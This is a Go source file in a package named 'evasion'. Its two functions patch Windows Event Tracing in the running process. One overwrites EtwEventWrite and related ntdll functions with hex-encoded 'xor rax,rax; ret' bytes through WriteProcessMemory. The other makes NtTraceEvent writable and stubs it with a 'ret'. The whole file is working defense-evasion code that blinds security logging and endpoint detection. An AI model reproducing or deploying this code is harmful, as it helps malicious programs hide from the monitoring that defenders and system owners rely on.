package evasion

import (
	"encoding/hex"
  "golang.org/x/sys/windows"
	"unsafe"
)

func PatchEtw() error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	WriteProcessMemory := windows.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")

	EtwEventWrite := ntdll.NewProc("EtwEventWrite")
	EtwEventWriteEx := ntdll.NewProc("EtwEventWriteEx")
	EtwEventWriteFull := ntdll.NewProc("EtwEventWriteFull")
	EtwEventWriteString := ntdll.NewProc("EtwEventWriteString")
	EtwEventWriteTransfer := ntdll.NewProc("EtwEventWriteTransfer")

	addresses := []uintptr{EtwEventWriteFull.Addr(), EtwEventWrite.Addr(), EtwEventWriteEx.Addr(), EtwEventWriteString.Addr(), EtwEventWriteTransfer.Addr()}

	for i := range addresses {
		data, _ := hex.DecodeString(string([]byte{'4', '8', '3', '3', 'C', '0', 'C', '3'}))

		WriteProcessMemory.Call(uintptr(0xffffffffffffffff), uintptr(addresses[i]), uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), 0)
	}

	return nil
}

func PatchEtw2() error {
  kernel32 := windows.NewLazyDLL("kernel32.dll")
  ntdll := windows.NewLazyDLL("ntdll.dll")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  NtTraceEvent := ntdll.NewProc("NtTraceEvent")
  NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
  NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

  pHandle, _, _ := GetCurrentProcess.Call()

  var patch = []byte{0xc3}
  var oldProtect uintptr
  var addr uintptr = NtTraceEvent.Addr()
  regionsize := uintptr(len(patch))

  r1, _, err := NtProtectVirtualMemory.Call(pHandle, uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&regionsize)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
  if r1 != 0 {
    return err
  }

  NtWriteVirtualMemory.Call(pHandle, addr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)

  r2, _, err := NtProtectVirtualMemory.Call(pHandle, uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&regionsize)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
  if r2 != 0 {
    return err
  }

  return nil
}

